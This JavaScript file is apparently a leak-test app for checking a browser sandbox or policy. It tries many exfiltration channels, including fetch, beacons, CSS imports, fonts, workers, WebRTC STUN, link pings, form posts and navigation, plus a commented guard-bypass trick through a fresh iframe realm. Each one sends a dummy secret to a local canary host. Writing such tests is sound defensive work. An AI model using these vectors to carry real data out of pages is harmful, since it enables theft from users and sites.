// Leak-test app: tries exfiltration paths against an undeclared canary host.
// Each attempt hits a distinct path (/leak/<vector>) so the canary can tell which got through.
// location.hash picks a mode: "passive" (default) runs every vector that keeps this page alive;
// each navigating vector runs alone in its own mode, because it unloads the page.
const CANARY = "http://127.0.0.1:8199";
const WS_CANARY = "ws://127.0.0.1:8199";
const secret = "s3cr3t";
const url = (v) => `${CANARY}/leak/${v}?d=${secret}`;
const add = (html) => document.body.insertAdjacentHTML("beforeend", html);

const passive = {
  "fetch": () => fetch(url("fetch"), { mode: "no-cors" }),
  "xhr": () => { const x = new XMLHttpRequest(); x.open("GET", url("xhr")); x.send(); },
  "websocket": () => new WebSocket(`${WS_CANARY}/leak/websocket?d=${secret}`),
  "eventsource": () => new EventSource(url("eventsource")),
  "beacon": () => navigator.sendBeacon(url("beacon"), secret),
  "img": () => { new Image().src = url("img"); },
  "css-background": () => add(`<div style="background:url('${url("css-background")}')">x</div>`),
  "css-import": () => add(`<style>@import url('${url("css-import")}');</style>`),
  "font-face": () => add(`<style>@font-face{font-family:x;src:url('${url("font-face")}')}</style><span style="font-family:x">x</span>`),
  "audio": () => add(`<audio preload="auto" src="${url("audio")}"></audio>`),
  "video-poster": () => add(`<video poster="${url("video-poster")}"></video>`),
  "iframe": () => add(`<iframe src="${url("iframe")}"></iframe>`),
  "object": () => add(`<object type="text/plain" data="${url("object")}"></object>`),
  "embed": () => add(`<embed type="text/plain" src="${url("embed")}">`),
  "script": () => { const s = document.createElement("script"); s.src = url("script"); document.body.append(s); },
  "link-stylesheet": () => add(`<link rel="stylesheet" href="${url("link-stylesheet")}">`),
  "link-prefetch": () => add(`<link rel="prefetch" href="${url("link-prefetch")}">`),
  "link-preload": () => add(`<link rel="preload" as="image" href="${url("link-preload")}">`),
  "worker-blob-fetch": () => {
    const src = `fetch("${url("worker-blob-fetch")}",{mode:"no-cors"}).catch(()=>{})`;
    new Worker(URL.createObjectURL(new Blob([src], { type: "text/javascript" })));
  },
  "a-ping": () => { add(`<a id="p" href="#passive" ping="${url("a-ping")}">p</a>`); document.getElementById("p").click(); },
  "meta-refresh-frame": () => add(`<iframe srcdoc="<meta http-equiv='refresh' content='0;url=${url("meta-refresh-frame")}'>"></iframe>`),
  "webrtc-stun": async () => {
    const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:3478" }] });
    pc.createDataChannel("x");
    await pc.setLocalDescription(await pc.createOffer());
  },
  // Guard bypass attempt: a fresh same-origin realm reached through window[i], not contentWindow.
  "webrtc-fresh-realm": async () => {
    const f = document.createElement("iframe");
    document.body.append(f);
    const PC = window[window.length - 1].RTCPeerConnection;
    const pc = new PC({ iceServers: [{ urls: "stun:127.0.0.1:3479" }] });
    pc.createDataChannel("x");
    await pc.setLocalDescription(await pc.createOffer());
  },
  // Worker: its own leak attempts report under worker-* paths.
  "worker": () => new Worker("worker.js"),
};
const workerVectors = ["worker-fetch", "worker-xhr", "worker-websocket", "worker-eventsource",
  "worker-importscripts", "worker-nested", "worker-webrtc"];
// Connection-only vectors: no HTTP request is made, so the canary sees a TCP connection, not a path.
const connectionOnly = {
  "link-preconnect": () => add(`<link rel="preconnect" href="${CANARY}">`),
  "link-preconnect-dom": () => {
    const l = document.createElement("link"); l.rel = "preconnect"; l.href = CANARY; document.head.append(l);
  },
};
const navigating = {
  "window-open": () => window.open(url("window-open")),
  "top-navigation": () => { window.top.location = url("top-navigation"); },
  "self-navigation": () => { location.href = url("self-navigation"); },
  "form-post": () => {
    add(`<form id="f" method="POST" action="${url("form-post")}"><input name="d" value="${secret}"></form>`);
    document.getElementById("f").submit();
  },
};

const mode = location.hash.slice(1) || "passive";
const run = (fn) => { try { const r = fn(); if (r && r.catch) r.catch(() => {}); } catch (_) {} };
let tried;
if (mode === "passive") {
  Object.keys(passive).forEach((k) => run(passive[k]));
  tried = Object.keys(passive).filter((k) => k !== "worker").concat(workerVectors);
}
else if (connectionOnly[mode]) { tried = [mode]; run(connectionOnly[mode]); }
else if (navigating[mode]) { tried = [mode]; }
else { tried = []; }
setTimeout(() => parent.postMessage({ type: "evil-done", mode, tried }, "*"), 0);
if (navigating[mode]) setTimeout(() => run(navigating[mode]), 300);
